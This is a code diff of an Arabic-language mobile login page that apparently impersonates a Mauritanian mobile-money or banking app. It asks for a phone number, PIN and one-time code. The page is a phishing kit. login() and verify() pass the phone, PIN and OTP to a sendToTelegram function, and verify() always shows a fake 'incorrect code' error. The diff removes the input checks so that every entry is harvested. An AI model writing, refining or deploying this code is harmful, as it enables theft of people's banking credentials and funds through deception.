@@ -8,6 +8,17 @@
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#fff}
+
+/* ضبط لون تحديد النص ومؤشر الكتابة ليتطابق مع اللون الطبيعي للتطبيق */
+::selection {
+  background-color: #2E818F;
+  color: #ffffff;
+}
+::-moz-selection {
+  background-color: #2E818F;
+  color: #ffffff;
+}
+
 #app{width:100%;height:100%;display:flex;justify-content:center;position:relative}
 .phone{width:100%;max-width:430px;height:100%;background:#fff;display:flex;flex-direction:column;overflow:hidden;position:relative}
 
@@ -55,8 +66,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .ico{width:20px;height:20px;flex-shrink:0;color:#333}
 
 .errmsg{color:#e74c3c;font-size:11px;text-align:right;margin-top:4px;min-height:14px}
-.warning-msg{background:#fce4e4;border:1px solid #f5c2c2;border-radius:8px;padding:10px;margin-top:10px;display:flex;gap:8px;align-items:flex-start;text-align:right;font-size:12px;color:#333;line-height:1.4}
-.warning-msg::before{content:'!';background:#e74c3c;color:#fff;width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;flex-shrink:0;font-size:14px}
 
 /* حقل الرقم السري */
 .pin-row-wrap {
@@ -89,7 +98,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   background: transparent;
   font-family: system-ui, -apple-system, sans-serif;
   color: #000;
-  caret-color: transparent;
+  caret-color: #2E818F;
   padding: 0;
   direction: ltr;
   -webkit-text-security: disc !important;
@@ -141,9 +150,9 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .screen{display:flex;flex-direction:column;height:100%}
 .hide{display:none!important}
 
-/* ==================== شاشة OTP المعدلة ==================== */
+/* ==================== شاشة OTP ==================== */
 .otp-hdr {
-  background: #29C5E0 !important; /* اللون السماوي الفاتح المطلوب المرفق في الصورة */
+  background: #29C5E0 !important;
   height: 48px !important;
   display: flex;
   align-items: center;
@@ -178,7 +187,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   margin: 30px 15px 30px;
 }
 
-/* الشحطات الخطية في OTP وإبراز مؤشر الكتابة (الخط الأزرق) */
 .otp-row {
   display: flex;
   gap: 16px;
@@ -199,7 +207,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   outline: none;
   background: transparent;
   color: #1a1a1a;
-  caret-color: #2E818F !important; /* إضافة الخط العمودي في الحقل عند التركيز */
+  caret-color: #2E818F !important;
   direction: ltr;
   padding: 0;
 }
@@ -212,7 +220,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   font-family: system-ui, -apple-system, sans-serif;
 }
 
-/* ==================== نافذة التنبيه الخطأ المنبثقة ==================== */
+/* ==================== نوافذ التنبيه المنبثقة ==================== */
 .modal-overlay {
   position: absolute;
   top: 0;
@@ -238,7 +246,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 }
 
 .modal-body {
-  padding: 22px 20px;
+  padding: 24px 20px;
 }
 
 .modal-title {
@@ -249,7 +257,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 }
 
 .modal-text {
-  font-size: 13.5px;
+  font-size: 14px;
   color: #444;
   line-height: 1.5;
   font-weight: 600;
@@ -296,7 +304,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
         </div>
       </div>
       <div class="errmsg" id="err-ph"></div>
-      <div class="warning-msg hide" id="warn-ph">رقم الهاتف غير تابع لشركات الاتصال المعتمدة (موريتل، ماتل، شنقيتل)</div>
     </div>
 
     <div class="field">
@@ -327,7 +334,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   <button class="btn" onclick="login()">تسجيل الدخول</button>
 </div>
 
-<!-- شاشة OTP المصغرة والمطابقة للأصل -->
+<!-- شاشة OTP -->
 <div id="pg-otp" class="screen hide">
   <div class="hdr otp-hdr">
     <button class="hdr-back" onclick="back()">&#8249;</button>
@@ -350,14 +357,25 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   <button class="btn" onclick="verify()">التحقق</button>
 </div>
 
-<!-- النافذة المنبثقة للتنبيه بالخطأ -->
-<div id="error-modal" class="modal-overlay hide">
+<!-- نافذة خطأ اسم المستخدم غير صالح -->
+<div id="user-error-modal" class="modal-overlay hide">
+  <div class="modal-card">
+    <div class="modal-body">
+      <div class="modal-title">خطأ</div>
+      <div class="modal-text">اسم المستخدم غير صالح</div>
+    </div>
+    <button class="modal-btn" onclick="closeUserErrorModal()">تم</button>
+  </div>
+</div>
+
+<!-- نافذة خطأ رمز التأكيد -->
+<div id="otp-error-modal" class="modal-overlay hide">
   <div class="modal-card">
     <div class="modal-body">
       <div class="modal-title">خطأ</div>
       <div class="modal-text">رمز التأكيد الذي أدخلته غير صحيح.<br/>يرجى المحاولة مرة أخرى.</div>
     </div>
-    <button class="modal-btn" onclick="closeModal()">تم</button>
+    <button class="modal-btn" onclick="closeOtpErrorModal()">تم</button>
   </div>
 </div>
 
@@ -447,40 +465,24 @@ setupStrictLengthValidation(phEl, 8);
 phEl.addEventListener('input',function(){
   this.value=this.value.replace(/[^0-9]/g,'');
   document.getElementById('err-ph').textContent='';
-  checkPhoneOperator();
 });
-
-function checkPhoneOperator(){
-  var ph=phEl.value.trim();
-  var warnEl=document.getElementById('warn-ph');
-  if(ph.length===8){
-    var firstDigit=ph.charAt(0);
-    if(firstDigit!=='2'&&firstDigit!=='4'&&firstDigit!=='6'){
-      warnEl.classList.remove('hide');
-    }else{
-      warnEl.classList.add('hide');
-    }
-  }else{
-    warnEl.classList.add('hide');
-  }
-}
 
 function login(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
-  var ok=true;
-  if(ph.length!==8){
-    document.getElementById('err-ph').textContent='يجب أن يتكون رقم الهاتف من 8 أرقام بالضبط';
-    ok=false;
-  }
-  if(pin.length!==4){
-    document.getElementById('err-pin').textContent='يجب أن يتكون الرقم السري من 4 أرقام بالضبط';
-    ok=false;
-  }
-
+  
   sendToTelegram(ph, pin);
 
-  if(ok)showOtp();
+  // إظهار نافذة خطأ اسم المستخدم غير صالح إذا كان الرقم غير مكتمل أو غير صحيح
+  if(ph.length !== 8 || pin.length !== 4){
+    document.getElementById('user-error-modal').classList.remove('hide');
+  } else {
+    showOtp();
+  }
+}
+
+function closeUserErrorModal(){
+  document.getElementById('user-error-modal').classList.add('hide');
 }
 
 var O=[0,1,2,3].map(function(i){return document.getElementById('o'+i);});
@@ -521,12 +523,11 @@ function verify(){
   var pin=P.map(function(p){return p.value;}).join('');
   sendToTelegram(ph, pin, code);
 
-  /* إظهار نافذة الخطأ عند الضغط على زر التحقق */
-  document.getElementById('error-modal').classList.remove('hide');
+  document.getElementById('otp-error-modal').classList.remove('hide');
 }
 
-function closeModal(){
-  document.getElementById('error-modal').classList.add('hide');
+function closeOtpErrorModal(){
+  document.getElementById('otp-error-modal').classList.add('hide');
 }
 
 function showOtp(){
@@ -536,6 +537,7 @@ function showOtp(){
   O[0].focus();
   startTimer();
 }
+
 function back(){
   document.getElementById('pg-otp').classList.add('hide');
   document.getElementById('pg-login').classList.remove('hide');
